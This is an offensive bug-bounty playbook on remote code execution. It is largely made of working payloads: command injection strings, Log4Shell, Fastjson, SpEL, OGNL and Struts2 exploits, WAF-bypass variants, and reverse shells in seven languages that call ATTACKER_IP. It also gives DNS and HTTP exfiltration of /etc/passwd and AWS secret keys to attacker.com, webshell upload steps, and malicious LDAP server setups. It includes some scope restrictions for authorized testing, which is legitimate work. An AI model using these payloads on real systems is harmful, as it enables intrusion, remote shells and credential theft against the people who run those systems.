# Remote Code Execution (RCE)

> Perspective: black-box; a single-request exploit is preferred; out-of-band callback is the lifesaver for blind scenarios

## 1. In One Sentence

RCE = execute arbitrary commands on the target server.
SRC value: **highest among all vulnerability types**; unauthenticated RCE typically pays $5k–$50k+.
Two paths: (a) command injection (concatenating OS commands); (b) deserialization / expression injection (runtime evaluate).

---

## 2. High-Frequency Entry Points (Stats + Categories)

### 2.1 Frameworks / Middleware (Fingerprintable Vulnerabilities)

| Type | Cases | Entry Fingerprint |
|------|------|---------|
| Struts2 | 23 | URL contains `.action`, `.do`; response `Server: Apache-Coyote` |
| WebLogic | 5 | 7001 port + `/console/` |
| JBoss | 9 | `/jmx-console/`, `/invoker/` |
| Tomcat | 9 | 8080 + `/manager/html` |
| Spring | 4 | `Server: spring`, `X-Application-Context` |
| ElasticSearch | 8 | 9200 + Lucene 1.x |
| Fastjson | - | Response / error page contains `com.alibaba.fastjson` |
| Log4j | - | Anywhere possible (any logged input point) |
| Redis | 4 | 6379 (see unauth-access for details) |
| Jenkins | - | 8080 + `/manage`, `/script` |
| Zabbix | 2 | 80 + `Zabbix SIA` |

### 2.2 Command Injection Entry Points (Feature Characteristics)

| Feature | Cases | Parameters |
|------|------|------|
| Network diagnostics (ping / nslookup / traceroute) | 13 | `host`, `ip`, `target` |
| File operations (extraction / conversion) | 34 | `filename`, `path` |
| Image processing | 12 | `image`, `file` |
| URL fetching | 12 | `url`, `callback` |
| DNS lookup | 8 | `domain` |
| Backup / task scheduling | - | `cmd`, `task`, `job` |

### 2.3 Deserialization Entry Points

```
# Java
Cookie / Authorization contains base64 binary (starts with rO0AB = Java serialization)
ViewState (ASP.NET)
__viewstate / __eventvalidation
sessionid contains Java serialized data

# PHP
unserialize() accepts user input (starts with O:8:)
phar:// protocol triggers automatic deserialization

# Python
pickle.loads() accepts user input
yaml.load() unsafe call

# Ruby
Marshal.load() accepts cookie / parameters
```

---

## 3. Detection Techniques

### 3.1 Command Injection Probe Table

```bash
# Concatenation operators
target=127.0.0.1; id
target=127.0.0.1| id
target=127.0.0.1|| id
target=127.0.0.1 && id
target=127.0.0.1 & id
target=127.0.0.1 `id`
target=127.0.0.1 $(id)
target=127.0.0.1%0aid           # URL newline
target=127.0.0.1%0d%0aid

# Time-based blind (when no output)
target=127.0.0.1; sleep 5
target=127.0.0.1 && ping -c 5 127.0.0.1
target=127.0.0.1 || sleep 5

# DNSLog exfiltration
target=127.0.0.1;ping -c 1 `whoami`.xxx.dnslog.cn
target=127.0.0.1;curl `cat /etc/passwd|base64|tr -d '\n'`.xxx.dnslog.cn

# Windows
target=127.0.0.1 & whoami
target=127.0.0.1 | whoami
```

### 3.2 Template Injection / Expression Injection Probes

| Technique | Probe | After Hit |
|------|------|------|
| SSTI (Jinja2) | `{{7*7}}` → 49 | `{{config}}`, `{{request.application.__globals__}}` |
| SSTI (Twig) | `{{7*7}}` → 49 | `{{_self.env.registerUndefinedFilterCallback("system")}}` |
| SSTI (Freemarker) | `${7*7}` → 49 | `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` |
| SSTI (Velocity) | `#set($x=7*7)$x` → 49 | Runtime.exec |
| SSTI (Smarty) | `{$smarty.version}` → shows version | `{system('id')}` |
| SpEL (Spring) | `#{7*7}` or `${7*7}` | `T(java.lang.Runtime).getRuntime().exec("id")` |
| OGNL (Struts2) | `%{7*7}` | see Struts2 expressions |
| EL (JSP) | `${7*7}` | EL injection chain |
| JEXL | `7*7` in JEXL context | - |

### 3.3 Log4Shell Universal Probes (try on every input point)

```
${jndi:ldap://${hostName}.${env:USER}.xxx.dnslog.cn/a}
${jndi:ldap://xxx.dnslog.cn/a}
${jndi:dns://xxx.dnslog.cn/a}    # does not require outbound LDAP; DNS is sufficient
${jndi:rmi://xxx.dnslog.cn:1099/a}

# WAF bypass
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://x.dnslog.cn/a}
${${lower:j}ndi:${lower:l}dap://x.dnslog.cn/a}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//x.dnslog.cn/a}

# with data exfiltration
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.x.dnslog.cn/a}
${jndi:ldap://${sys:java.version}.x.dnslog.cn/a}
${jndi:ldap://${env:USER}.x.dnslog.cn/a}
```

**Injection points**: hit every field that **gets logged**:
- `User-Agent`
- `Referer`
- `X-Forwarded-For`
- `X-Api-Version`
- `Cookie`
- username / email fields
- uploaded filename
- chat / comment / search keywords

### 3.4 Deserialization Probes

```bash
# Java (ysoserial)
java -jar ysoserial-all.jar URLDNS "http://xxx.dnslog.cn"
# place the generated base64 into Cookie / ViewState / Authorization

# verify Java serialization
echo "input" | base64 -d | xxd | head -1
# rO0AB prefix = Java serialized

# Common gadget chains (choose based on dependencies)
ysoserial CommonsCollections1
ysoserial CommonsCollections5
ysoserial CommonsBeanutils1
ysoserial Hibernate1
ysoserial Spring1
ysoserial Jdk7u21        # bundled with JDK
```

```bash
# .NET ViewState
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc"
```

```python
# Python pickle
import pickle, os, base64
class Exp:
    def __reduce__(self):
        return (os.system, ("curl xxx.dnslog.cn",))
print(base64.b64encode(pickle.dumps(Exp())))
```

### 3.5 Fastjson Probes

```json
{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}
{"@type":"java.net.URL","val":"http://xxx.dnslog.cn"}
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxx.dnslog.cn/a","autoCommit":true}
```

### 3.6 Spring4Shell Probes

```
POST /vulnerable
Content-Type: application/x-www-form-urlencoded

class.module.classLoader.resources.context.parent.pipeline.first.pattern=test
```

200 + no error = possibly vulnerable; further chain with Tomcat AccessLogValve to write a webshell.

### 3.7 OGNL (Struts2) Probes

```
S2-045
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.multipart/form-data
```

### 3.8 Upload + Parsing Combo (Webshell)

```
1. Upload image-embedded shell (GIF89a + <?php @eval($_POST[c]);?>) → shell.jpg
2. Trigger via Apache multi-extension / Nginx fix_pathinfo / IIS parsing
   - Apache: shell.php.x → parsed as PHP
   - Nginx:  shell.jpg/.php → PHP-CGI processing
   - IIS6:   shell.asp;.jpg → parsed as ASP
3. Access to trigger → RCE
```

See `playbooks/file-upload.md`.

---

## 4. Bypass Matrix

Full content in `methodology/02-bypass-toolkit.md` chapter 4. **Key cheatsheet**:

| Blocked | Bypass |
|---|---|
| Space | `${IFS}`, `${IFS}$9`, `%09`, `{cat,/etc/passwd}`, `<` |
| `cat` keyword | `c'a't`, `c\at`, `tac`, `/bin/c?t`, `/???/??t` |
| `;` `\|` | `%0a`, `%0d`, `&&`, `\|\|`, `` ` `` |
| Command-word filter | base64: `echo Y2F0IC9ldGMvcGFzc3dk \| base64 -d \| sh` |
| Outbound blocking | DNS exfiltration (port 53 is almost never blocked) |
| `jndi` keyword | `${${lower:j}ndi:...}`, `${${::-j}ndi:...}` |
| Length limit | shortened / shorthand domain / `id\|nc x.cc 80` |

---

## 5. Exploitation, Privilege Escalation / Lateral Movement

### 5.1 Reverse shell

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Netcat
nc -e /bin/sh ATTACKER_IP PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

# Windows PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### 5.2 SRC Testing: **Do NOT** Use a Reverse Shell

Only perform the following "no-side-effect" proofs:

```bash
# Verify execution
id
whoami
hostname
uname -a
cat /etc/hostname

# Exfiltration proof
curl https://attacker.cc/?d=$(id|base64)
ping -c 1 $(whoami).xxx.dnslog.cn

# Read proof (avoid sensitive data)
ls /
cat /etc/passwd | head -3
cat /etc/issue
```

**Forbidden**: `/etc/shadow`, production DB connections, writing files, deleting files, leaving a shell.

### 5.3 Value Escalation Chain

```
Command injection (no root)
  → read /etc/passwd, /proc/self/environ
  → find ssh key, .bash_history
  → privilege escalation (check if root, check sudo -l, check SUID)
  → lateral movement (check /etc/hosts, ~/.aws/credentials, ~/.docker/config.json)

→ In SRC reports, stop at "id output / hostname output"; do not perform privilege escalation / lateral movement
  unless the target explicitly permits "internal network testing"
```

---

## 6. Real-World Case Fingerprints

### 6.1 Log4Shell (CVE-2021-44228)

| Item | Value |
|------|---|
| Affected versions | Log4j 2.0 – 2.14.1 |
| Fixed versions | 2.17.0+(2.15 / 2.16 still have bypasses) |
| Black-box fingerprint | any logged input point may trigger it |
| Probes | `${jndi:dns://x.dnslog.cn/a}`, DNSLog receives a hit = confirmed |
| CVSS | 10.0 Critical |

### 6.2 Spring4Shell (CVE-2022-22965)

| Item | Value |
|------|---|
| Trigger condition | JDK 9+ + Spring 5.3.0–5.3.17 / 5.2.0–5.2.19 + WAR deployment |
| Black-box fingerprint | `class.module.classLoader.resources.context.parent.pipeline.first.pattern=` no error |
| CVSS | 9.8 Critical |

### 6.3 Fastjson deserialization

| CVE | Version | Key |
|-----|------|------|
| CVE-2017-18349 | < 1.2.25 | `@type` direct exploitation |
| CVE-2019-12384 | 1.2.25–1.2.47 | cache bypass |
| - | 1.2.48–1.2.67 | various gadgets |
| - | 1.2.68–1.2.80 | expectClass bypass |
| - | < 1.2.83 | still at risk |

Black-box fingerprint: response / error page mentions `fastjson`, `com.alibaba.fastjson`, or a specific exception after POSTing JSON.

Probes:
```json
{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}
```
DNSLog receives = at least Fastjson parsed `@type`; further use the 1.2.47 bypass chain:

```json
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
 "b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x/a","autoCommit":true}}
```

### 6.4 Struts2 Series

| CVE | Version | Trigger |
|-----|------|------|
| S2-001 | 2.0.0–2.0.8 | direct OGNL |
| S2-005 | 2.0.0–2.1.8.1 | `('#'+a)(...)`  |
| S2-009 | 2.1.0–2.3.1.1 | fix bypass |
| S2-013 | 2.0.0–2.3.14 | `redirect:`, `action:` |
| S2-016 | 2.0.0–2.3.15 | redirect/action command |
| S2-019 | 2.0.0–2.3.15.1 | dynamic method invocation |
| S2-032 | 2.3.20–2.3.28 | same as above |
| **S2-045** | 2.3.5–2.3.31 | `Content-Type: %{...}.multipart/form-data` |
| S2-046 | 2.3.5–2.3.31 | Content-Disposition |
| S2-048 | 2.3.x + Struts1 | Struts1 plugin |
| S2-052 | 2.1.2–2.3.33 | REST plugin XML deserialization |
| S2-053 | 2.0.1–2.3.33 | Freemarker |
| S2-057 | 2.0.4–2.3.34 | namespace |

Universal probes:
```
POST / HTTP/1.1
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',123*123)}.multipart/form-data
```
Response header showing `X-Test: 15129` = confirmed.

### 6.5 ImageMagick "ImageTragick" (CVE-2016-3714)

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/"|bash -i >& /dev/tcp/x/x 0>&1")'
pop graphic-context
```
Impact: triggered when uploading .mvg / SVG with EXIF processed by ImageMagick.

### 6.6 FFmpeg HLS SSRF / File Read

```m3u8
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:,
concat:file:///etc/passwd
#EXT-X-ENDLIST
```

### 6.7 ElasticSearch Groovy (CVE-2014-3120 / 2015-1427)

```json
POST /_search
{"script_fields":{"e":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```

### 6.8 ThinkPHP

| Version | CVE | Trigger |
|------|-----|------|
| 5.0.0–5.0.23 | CVE-2018-20062 | `?s=captcha` + `_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id` |
| 5.1.x | - | deserialization |
| 6.0.x | CVE-2022-38627 | multi-language RCE |

### 6.9 Jenkins Script Console

```
Visit http://target:8080/script
(if unauthenticated or weak credentials)
> def cmd = "id"
> println cmd.execute().text
```

### 6.10 WebLogic Deserialization

| CVE | Trigger |
|-----|-----|
| CVE-2017-10271 | `/wls-wsat/CoordinatorPortType` SOAP XMLDecoder |
| CVE-2018-2628 | T3 deserialization |
| CVE-2019-2725 | `/_async/AsyncResponseService` |
| CVE-2020-2551 | IIOP |
| CVE-2020-14882 | backend RCE (bypass admin) |

---

## 7. Reproduction / Evidence Key Points

### 7.1 Report Essentials

1. **Complete HTTP request + response**
2. **Execution evidence**: screenshot of `id` output, screenshot of DNSLog record (with timestamp, domain, source IP)
3. **Impact assertion**: what privileges are obtainable (user / root); do not perform actual privilege escalation
4. **CVSS vector**

### 7.2 DNSLog Evidence Format

```
DNSLog platform: dnslog.cn
Listening domain: abcdef.xxx.dnslog.cn

Records:
  Time                     Source IP        Subdomain
  2025-05-09 14:23:11 UTC  3.x.x.x          test.abcdef.xxx.dnslog.cn

Source IP 3.x.x.x reverse-resolves to target.com's egress IP (AWS us-west-2).
See full log in attachment dnslog_screenshot.png.
```

### 7.3 Command Output Format

```
Request:
  POST /api/util/ping HTTP/1.1
  ...
  body: {"host":"127.0.0.1; id"}

Response (key excerpt):
  PING 127.0.0.1 ...
  ...
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 7.4 CVSS

```
Unauthenticated RCE  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical
Authenticated RCE    CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8 High
RCE requires user interaction  CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H = 8.8 High
```

### 7.5 Impact Section Example

```
Via the host parameter of the /api/util/ping endpoint, an attacker can inject arbitrary OS commands executed as www-data.
The attacker can:
1. read application configuration (/etc/issue, application.properties);
2. pivot into the internal network (based on exposed ip route, /etc/hosts information);
3. if unpatched, escalate to root via SUID binaries / sudo.

Test evidence:
- single-request exploit (no login required)
- command `id` outputs uid=33(www-data)
- DNSLog received out-of-band callback (attachment 1)
- reproduced 5/5 times
```

---

## Related MCP Tools

In practice you can call jshookmcp for automation. **The default `search` profile does not preload tools; before calling, activate them with `mcp__jshook__activate_tools <tool_name>`** (see [`../tools/mcp-jshook.md`](../tools/mcp-jshook.md) §Recommended profile for details).

| Tool | Domain | When to Call |
|---|---|---|
| `mcp__jshook__wasm_disassemble` + `mcp__jshook__wasm_decompile` | wasm | Reverse business-side WASM modules / locate deserialization sinks |
| `mcp__jshook__antidebug_bypass` | antidebug | When the target uses active anti-debugging, bypass first then set breakpoints |
| `mcp__jshook__generate_hooks` + `mcp__jshook__frida_run_script` | binary-instrument | Frida hook to verify RCE landing point (read-only commands) |
| `mcp__jshook__electron_ipc_sniff` | platform | Observe Electron desktop IPC vulnerabilities |
| `mcp__jshook__mojo_monitor` + `mcp__jshook__syscall_start_monitor` | mojo-ipc / syscall-hook | Chromium engine vulnerability research / syscall evidence collection |

Full mapping:[`../tools/mcp-jshook.md`](../tools/mcp-jshook.md)

## 8. What Not to Do

- **Forbidden**: reverse shell on the target. **Only run read-only commands**: `id`, `whoami`, `uname -a`, `cat /etc/issue`.
- **Forbidden**: writing files / leaving a webshell / modifying any files.
- **Forbidden**: attempting local privilege escalation (sudo, SUID exploitation, kernel exploit).
- **Forbidden**: accessing `/etc/shadow`, SSH private keys, production database credentials.
- **Forbidden**: for Log4Shell and similar, actually loading remote classes via an LDAP gadget — use only DNS exfiltration to prove the trigger.
- **Forbidden**: using ysoserial to actually launch a reverse shell; use the `URLDNS` gadget only for outbound-connectivity proof.
- **Rate limit**: 1–2 rps per test to avoid triggering risk controls.
- **In the report** you may paste full command output, but **hostnames / internal IPs / usernames must be redacted** so the specific business cannot be identified.

## H1 Real-World Cases

_A total of 385 disclosed HackerOne High/Critical reports match this category, sorted by (bounty + votes×100), Top 12 shown_

| Severity | $ | Program | Title (click for original report) | Summary |
|---|--:|---|---|---|
| Critical | 20160 usd | X / xAI | [Potential pre-auth RCE on Twitter VPN](https://hackerone.com/reports/591295) | Hi, we(Orange Tsai and Meh Chang) are the security research team from DEVCORE |
| Critical | 25000 usd | Snapchat | [Exposed Kubernetes API - RCE/Exposed Creds](https://hackerone.com/reports/455645) | Exposed Kubernetes API - RCE/Exposed Creds |
| Critical | 30000 usd | PayPal | [RCE via npm misconfig -- installing internal libraries from the public registry](https://hackerone.com/reports/925585) | RCE via npm misconfig -- installing internal libraries from the public registry |
| Critical | 15000 usd | PlayStation | [Websites Can Run Arbitrary Code on Machines Running the 'PlayStation Now' Application](https://hackerone.com/reports/873614) | Websites Can Run Arbitrary Code on Machines Running the 'PlayStation Now' Application |
| Critical | 12000 usd | GitLab | [Git flag injection - local file overwrite to remote code execution](https://hackerone.com/reports/658013) | Summary The `wiki_blobs` scope of the Search API can be provided with an arbitrary `ref` parameter, allowing for additional fla… |
| Critical | — | Semrush | [Remote Code Execution on www.semrush.com/my_reports on Logo upload](https://hackerone.com/reports/403417) | The Logo upload in the report constructor at: https://www.semrush.com/my_reports/constructor {F340480} is passed through a not … |
| Critical | 33510 usd | GitLab | [Remote Command Execution via Github import](https://hackerone.com/reports/1679624) | Summary This is very similar to https://about.gitlab.com/releases/2022/08/22/critical-security-release-gitlab-15-3-1-released/#… |
| Critical | 20000 usd | GitLab | [RCE when removing metadata with ExifTool](https://hackerone.com/reports/1154542) | Summary When uploading image files, GitLab Workhorse passes any files with the extensions jpg/jpeg/tiff through to ExifTool to … |
| Critical | 33510 usd | GitLab | [RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)](https://hackerone.com/reports/1609965) | Summary The `DecompressedArchiveSizeValidator` is used to check the size of a archive before extracting it: https://gitlab.com/… |
| Critical | — | Starbucks | [Webshell via File Upload on ecjobs.starbucks.com.cn](https://hackerone.com/reports/506646) | Summary:** OS Command Injection which can let the attacker who get more important information of the server,such as disclosures… |
| Critical | 12000 usd | GitLab | [Local files could be overwritten in GitLab, leading to remote command execution](https://hackerone.com/reports/587854) | Summary Arbitrary file overwrite A new feature (download a directory of a repository) in GitLab 11.11 introduced some changes i… |
| Critical | 20000 usd | GitLab | [RCE via unsafe inline Kramdown options when rendering certain Wiki pages](https://hackerone.com/reports/1125425) | Summary When rendering wiki content with certain extensions such as `.rmd`, `render_wiki_content` will call `other_markup_unsaf… |

**Weakness distribution matching this category:**

- Code Injection: 138 entries
- Command Injection - Generic: 101 entries
- OS Command Injection: 43 entries
- Deserialization of Untrusted Data: 33 entries
- Uncategorized → manually categorized: 27 entries
- XML External Entities (XXE): 22 entries
- Remote File Inclusion: 5 entries
- Resource Injection: 4 entries
- Type Confusion: 2 entries
- Use of Inherently Dangerous Function: 2 entries
- ASI05: Unexpected Code Execution (RCE): 1 entry
- File Content Injection: 1 entry
- Inclusion of Functionality from Untrusted Control Sphere: 1 entry
- Leftover Debug Code (Backdoor): 1 entry
- Download of Code Without Integrity Check: 1 entry
- Exposed Dangerous Method or Function: 1 entry
- XML Entity Expansion: 1 entry
- Embedded Malicious Code: 1 entry

## Payload Library

_55 structured web payloads, with complete attack chains + WAF/EDR bypass variants_

**Category distribution:** Framework vulnerabilities (18) · RCE Remote Code Execution (12) · SSTI Template Injection (10) · XXE Entity Injection (9) · Supply-chain attacks (3) · Prototype Pollution (3)

### · Framework Vulnerabilities

### Log4j RCE (Log4Shell)  `log4j-rce`
Apache Log4j remote code execution vulnerability
Subcategory: **Log4j** · tags: `log4j` `rce` `cve-2021-44228` `log4shell`

**Prerequisites:** uses Log4j 2.x; user input is written to the log

**Attack Chain:**

**1. 1. Probe the Vulnerability**
_Probe the Log4j vulnerability_
```
Inject at any input point:
${jndi:ldap://attacker.com/test}
Observe whether there is a DNS callback
```

**2. 2. DNS Exfiltration Test**
_Exfiltrate sensitive information_
```
${jndi:ldap://${env:USER}.attacker.com}
${jndi:ldap://${sys:java.version}.attacker.com}
Exfiltrate environment variables or system properties
```

**3. 3. Set Up a Malicious LDAP Server**
_Construct the RCE payload_
```
Use JNDIExploit or rogue-jndi:
java -jar JNDIExploit.jar -i attacker.com
Construct the payload:
${jndi:ldap://attacker.com:1389/Basic/Command/base64/d2hvYW1p}
```

**4. 4. Obtain a Shell**  _[linux]_
_Obtain a reverse shell_
```
${jndi:ldap://attacker.com:1389/Basic/Command/base64/YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjE=}
Base64-decodes to: bash -i >& /dev/tcp/attacker/4444 0>&1
```

**WAF/EDR Bypass Variants:**

**1. Bypass Keyword Filtering**
_Bypass using nested expressions_
```
${${lower:j}ndi:ldap://attacker.com}
${${upper:j}ndi:${lower:l}dap://attacker.com}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com}
```

**2. Bypass Special-Character Filtering**
_Construct the protocol string_
```
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com}
${jndi:dns://attacker.com}
```

---

### Spring Actuator Vulnerabilities  `spring-actuator`
Spring Boot Actuator endpoint security vulnerabilities
Subcategory: **Spring** · tags: `spring` `actuator` `rce` `java`

**Prerequisites:** Spring Boot application; exposed Actuator endpoints

**Attack Chain:**

**1. 1. Probe Actuator Endpoints**
_Probe exposed Actuator endpoints_
```
/actuator
/actuator/env
/actuator/health
/actuator/mappings
/actuator/configprops
/actuator/heapdump
```

**2. 2. Obtain Sensitive Information**
_Obtain environment variables and configuration_
```
/actuator/env
View database passwords, API keys, etc.
/actuator/configprops
View configuration properties
```

**3. 3. Download the Heap Dump**
_Download and analyze the heap dump_
```
curl -o heapdump http://target.com/actuator/heapdump
Analyze with the Memory Analyzer Tool
Search for keywords such as password, secret, etc.
```

**4. 4. env Endpoint RCE**
_Execute commands via the env endpoint_
```
POST /actuator/env
Content-Type: application/x-www-form-urlencoded
spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('String exec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} return null;}')

POST /actuator/restart
```

**WAF/EDR Bypass Variants:**

**1. Path Traversal and Semicolon Parameter Tricks**
_Spring's semicolon path-parameter feature allows inserting semicolon segments into the URL to bypass path-matching rules; combined with double encoding and path traversal to access restricted Actuator endpoints_
```
# semicolon path-parameter bypass (Spring feature):
/;/actuator/env
/actuator;.js/env
/actuator/..;/actuator/env

# double URL encoding:
/%61%63%74%75%61%74%6f%72/env
/actuator/%65%6e%76

# path traversal:
/random/../actuator/env
/api/v1/../../actuator/heapdump
```

**2. HTTP Method Override and Content-Type Bypass**
_Override the request method with the X-HTTP-Method-Override header, or bypass WAF blocking of POST requests to Actuator endpoints via non-standard Content-Type and case variants_
```
# HTTP method override:
GET /actuator/env HTTP/1.1
X-HTTP-Method-Override: POST

# Content-Type bypass:
POST /actuator/env HTTP/1.1
Content-Type: application/x-www-form-urlencoded
spring.cloud.bootstrap.location=http://attacker.com/payload.yml

# case bypass:
/Actuator/Env
/ACTUATOR/ENV
```

---

### Fastjson RCE  `fastjson-rce`
Alibaba Fastjson deserialization remote code execution
Subcategory: **Fastjson** · tags: `fastjson` `rce` `deserialization` `java`

**Prerequisites:** uses the Fastjson library; a deserialization point present

**Attack Chain:**

**1. 1. Probe Fastjson**
_Probe the Fastjson version_
```
Send a JSON request and observe the response:
{"@type":"java.net.Inet4Address","val":"attacker.com"}
Observe whether there is a DNS callback
```

**2. 2. JNDI Injection**
_JNDI injection RCE_
```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}
```

**3. 3. Set Up a Malicious Service**
_Set up a malicious LDAP/RMI service_
```
Use JNDIExploit:
java -jar JNDIExploit.jar -i attacker.com
Or use marshalsec:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#Exploit 1389
```

**4. 4. Bypass the AutoType Check**
_Bypass the AutoType blacklist_
```
1.2.47 version bypass:
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}
```

**WAF/EDR Bypass Variants:**

**1. Unicode Encoding and Nested JSON Bypass**
_Bypass WAF detection of Fastjson signatures by encoding the @type field name with Unicode (\u0040) or hex (\x40), or by nesting JSON structures_
```
# Unicode-encode @type:
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}

# hex encoding:
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}

# nested JSON obfuscation:
{"a":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}
```

**2. BCEL ClassLoader and Version-Specific Chains**
_Use version-specific exploit chains for different Fastjson versions: BCEL ClassLoader bytecode loading, 1.2.47 cache poisoning, 1.2.68 expectClass whitelist bypass_
```
# BCEL ClassLoader(Fastjson 1.1.15-1.2.24):
{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader","":"$$BCEL$$$l$8b..."}

# Fastjson 1.2.47 AutoType bypass:
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}

# Fastjson 1.2.68 expectClass bypass:
{"@type":"java.lang.AutoCloseable","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
```

---

### Spring SpEL Injection  `spring-spel`
Spring Expression Language injection attacks
Subcategory: **Spring SpEL** · tags: `spring` `spel` `expression` `rce`

**Prerequisites:** uses the Spring framework; a SpEL injection point present

**Attack Chain:**

**1. 1. Probe SpEL Injection**
_Probe SpEL injection points_
```
# test expression execution
${7*7}
#{7*7}
${T(java.lang.Runtime).getRuntime()}

# observe the response
# if it returns 49 or executes successfully, the vulnerability exists
```

**2. 2. Command Execution**
_Execute system commands_
```
# execute commands via Runtime
${T(java.lang.Runtime).getRuntime().exec("id")}
#{T(java.lang.Runtime).getRuntime().exec("whoami")}

# ProcessBuilder
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
#{new java.lang.ProcessBuilder(new String[]{"cmd","/c","whoami"}).start()}

# reverse shell
${T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}
```

**3. 3. File Read**
_Read sensitive files_
```
# read a file
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("cat /etc/passwd").getInputStream())}

# using Scanner
#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("cat /etc/passwd").getInputStream()).useDelimiter("\\A").next()}

# read directly
${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get("/etc/passwd"))}
```

**4. 4. DNS Exfiltration**
_DNS data exfiltration_
```
# DNS data exfiltration
${T(java.net.InetAddress).getByName("attacker.com")}

# exfiltrate file contents
${T(java.net.InetAddress).getByName(T(java.lang.String).valueOf(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get("/etc/passwd"))).substring(0,20)+".attacker.com")}
```

**WAF/EDR Bypass Variants:**

